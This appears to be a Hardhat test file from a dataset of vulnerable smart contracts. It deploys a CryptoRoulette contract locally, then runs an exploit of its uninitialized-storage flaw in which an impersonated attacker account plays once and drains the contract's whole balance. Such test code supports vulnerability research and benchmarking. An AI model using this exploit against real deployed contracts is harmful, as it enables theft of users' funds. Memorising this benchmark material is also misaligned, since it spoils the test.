const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack other/crypto_roulette.sol", function () {
  let owner;
  async function deployContracts() {
    [owner] = await ethers.getSigners();
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/other/crypto_roulette.sol/CryptoRoulette.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const CryptoRoulette = await ethers.getContractFactory(
      json.abi,
      json.bytecode,
    );
    const victim = await CryptoRoulette.deploy();
    await victim.connect(owner).waitForDeployment();
    return { victim };
  }

  it("sanity check: other/crypto_roulette.sol", async function () {
    const { victim } = await loadFixture(deployContracts);
    const [v, a] = await ethers.getSigners();
    await expect(
      victim.connect(a).play(10, { value: ethers.parseEther("0.1") }),
    ).to.not.be.reverted;
  });

  it("exploit uninitialized storage vulnerability", async function () {
    const { victim } = await loadFixture(deployContracts);
    const amount = ethers.parseEther("1");
    await owner.sendTransaction({ to: victim.target, value: amount });

    const contractBalance = await ethers.provider.getBalance(victim.target);

    expect(contractBalance).to.be.equal(amount);
    const attacker_addr = "0x000000000000000000000000000000000000000a";
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [attacker_addr],
    });
    const attacker_sign = await ethers.getSigner(attacker_addr);

    // attacker account needs ether to send its txs, it doesn't have to be from the owner
    await owner.sendTransaction({ to: attacker_addr, value: amount });
    const balanceBefore = await ethers.provider.getBalance(attacker_addr);
    expect(balanceBefore).to.be.equal(amount);

    const tx = await victim
      .connect(attacker_sign)
      .play(10, { value: ethers.parseEther("0.1") });
    const receipt = await tx.wait();
    const balanceAfter = await ethers.provider.getBalance(attacker_addr);
    expect(balanceAfter).to.be.equal(
      amount - receipt.gasUsed * receipt.gasPrice + amount,
    );

    const contractBalanceAfter = await ethers.provider.getBalance(
      victim.target,
    );
    expect(contractBalanceAfter).to.be.equal(0);
  });
});
